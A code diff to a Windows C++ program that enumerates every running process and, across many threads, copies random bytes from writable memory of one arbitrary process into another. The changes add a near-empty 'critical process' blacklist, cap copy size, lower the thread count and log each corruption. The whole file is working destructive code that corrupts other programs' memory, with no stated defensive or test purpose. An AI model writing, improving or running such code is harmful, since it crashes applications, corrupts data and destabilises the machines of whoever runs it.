@@ -8,9 +8,15 @@
 #include <mutex>
 #include <algorithm>
 #include <chrono>
+#include <set>
 
 // Mutex for synchronized output to the console
 std::mutex cout_mutex;
+
+// Blacklist of critical process names (lowercase for comparison)
+const std::set<std::string> critical_processes = {
+    "conhost.exe",
+};
 
 // Generate a random integer
 int random_int(int min, int max) {
@@ -20,22 +26,38 @@ int random_int(int min, int max) {
     return dis(gen);
 }
 
-// Get a list of all running processes, excluding the current process
+// Get a list of all running processes, excluding the current process and critical processes
 std::vector<DWORD> get_process_list() {
     std::vector<DWORD> process_list(1024);
     DWORD bytes_needed;
-    DWORD current_pid = GetCurrentProcessId(); // Get the current process ID
+    DWORD current_pid = GetCurrentProcessId();
     if (!EnumProcesses(process_list.data(), process_list.size() * sizeof(DWORD), &bytes_needed)) {
         return {};
     }
     process_list.resize(bytes_needed / sizeof(DWORD));
-    // Remove the current process ID from the list
-    process_list.erase(
-        std::remove_if(process_list.begin(), process_list.end(),
-            [current_pid](DWORD pid) { return pid == current_pid; }),
-        process_list.end()
-    );
-    return process_list;
+
+    // Filter out current process and critical processes
+    std::vector<DWORD> filtered_list;
+    for (DWORD pid : process_list) {
+        if (pid == current_pid) continue; // Skip current process
+
+        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+        if (hProcess) {
+            char process_name[MAX_PATH] = "";
+            if (GetProcessImageFileNameA(hProcess, process_name, MAX_PATH)) {
+                // Extract just the filename from the full path
+                std::string name = process_name;
+                name = name.substr(name.find_last_of("\\") + 1);
+                // Convert to lowercase for comparison
+                std::transform(name.begin(), name.end(), name.begin(), ::tolower);
+                if (critical_processes.find(name) == critical_processes.end()) {
+                    filtered_list.push_back(pid);
+                }
+            }
+            CloseHandle(hProcess);
+        }
+    }
+    return filtered_list;
 }
 
 // Get a handle to a process
@@ -75,6 +97,21 @@ std::vector<MEMORY_BASIC_INFORMATION> get_writable_memory_regions(HANDLE process
     return regions;
 }
 
+// Get process name for logging
+std::string get_process_name(DWORD pid) {
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!hProcess) return "Unknown";
+    char process_name[MAX_PATH] = "";
+    if (GetProcessImageFileNameA(hProcess, process_name, MAX_PATH)) {
+        std::string name = process_name;
+        name = name.substr(name.find_last_of("\\") + 1);
+        CloseHandle(hProcess);
+        return name;
+    }
+    CloseHandle(hProcess);
+    return "Unknown";
+}
+
 // Manipulate process memory by reading from one process and writing to another
 void manipulate_process_memory(DWORD source_pid, DWORD target_pid) {
     try {
@@ -94,10 +131,15 @@ void manipulate_process_memory(DWORD source_pid, DWORD target_pid) {
         }
         MEMORY_BASIC_INFORMATION source_region = source_regions[random_int(0, source_regions.size() - 1)];
         MEMORY_BASIC_INFORMATION target_region = target_regions[random_int(0, target_regions.size() - 1)];
-        SIZE_T size = static_cast<SIZE_T>(random_int(1, static_cast<int>(std::min(source_region.RegionSize, target_region.RegionSize))));
+        SIZE_T size = std::min(static_cast<SIZE_T>(random_int(1, 1024)), std::min(source_region.RegionSize, target_region.RegionSize));
         std::vector<BYTE> buffer = read_memory(source_handle, source_region.BaseAddress, size);
         if (!buffer.empty()) {
             write_memory(target_handle, target_region.BaseAddress, buffer);
+            // Log the operation
+            std::lock_guard<std::mutex> lock(cout_mutex);
+            std::cout << "Manipulated " << size << " bytes from " << get_process_name(source_pid)
+                      << " (PID: " << source_pid << ") to " << get_process_name(target_pid)
+                      << " (PID: " << target_pid << ")" << std::endl;
         }
         CloseHandle(source_handle);
         CloseHandle(target_handle);
@@ -125,8 +167,6 @@ void worker_thread() {
                 while (target_pid == source_pid) {
                     target_pid = new_pids[random_int(0, new_pids.size() - 1)];
                 }
-                std::lock_guard<std::mutex> lock(cout_mutex);
-                std::cout << "Manipulating memory from PID " << source_pid << " to PID " << target_pid << std::endl;
                 manipulate_process_memory(source_pid, target_pid);
             }
             std::this_thread::sleep_for(std::chrono::milliseconds(500));
@@ -137,9 +177,10 @@ void worker_thread() {
 }
 
 int main() {
-    const int num_threads = 40000; // Note: This is extremely high and likely problematic
+    const int num_threads = 20; // Use CPU core count
     std::vector<std::thread> threads;
     try {
+        std::cout << "Starting " << num_threads << " threads..." << std::endl;
         for (int i = 0; i < num_threads; ++i) {
             threads.emplace_back(worker_thread);
         }
